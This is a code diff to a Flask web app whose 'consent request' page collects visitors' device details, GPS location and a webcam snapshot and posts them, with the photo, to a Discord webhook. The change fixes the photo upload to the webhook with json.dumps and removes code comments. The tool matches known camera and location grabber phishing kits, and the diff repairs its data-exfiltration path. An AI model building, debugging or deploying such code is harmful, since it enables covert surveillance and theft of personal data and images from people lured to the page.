@@ -1,5 +1,6 @@
 import os
 import base64
+import json
 import requests
 from flask import Flask, render_template_string, request, jsonify
 
@@ -49,7 +50,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-             法律声明：<br>
+            ⚠️ 法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
@@ -94,7 +95,6 @@ HTML_TEMPLATE = """
             let locationData = "Non autorisé";
             let imageBase64 = null;
 
-            // Collecte des informations de l'appareil
             let deviceInfo = {
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
@@ -103,7 +103,6 @@ HTML_TEMPLATE = """
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
             };
 
-            // 1. Géolocalisation GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
@@ -113,7 +112,6 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
-            // 2. Capture de la caméra
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 const videoElement = document.getElementById('webcam');
@@ -137,7 +135,6 @@ HTML_TEMPLATE = """
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
-            // 3. Envoi des données
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -184,7 +181,6 @@ def submit_consent():
     device = data.get("device", {})
     image_data = data.get("image")
 
-    # Message au format Français pour Discord
     payload = {
         "content": (
             f"✅ **Nouveau consentement et détails de l'appareil:**\n"
@@ -204,7 +200,13 @@ def submit_consent():
             files = {
                 "file": ("snapshot.jpg", image_bytes, "image/jpeg")
             }
-            resp = requests.post(DISCORD_WEBHOOK_URL, data={"payload_json": str(payload).replace("'", '"')}, files=files, timeout=10)
+            # استخدام json.dumps لحل مشكلة الخطأ 400
+            resp = requests.post(
+                DISCORD_WEBHOOK_URL, 
+                data={"payload_json": json.dumps(payload)}, 
+                files=files, 
+                timeout=10
+            )
         else:
             resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
 
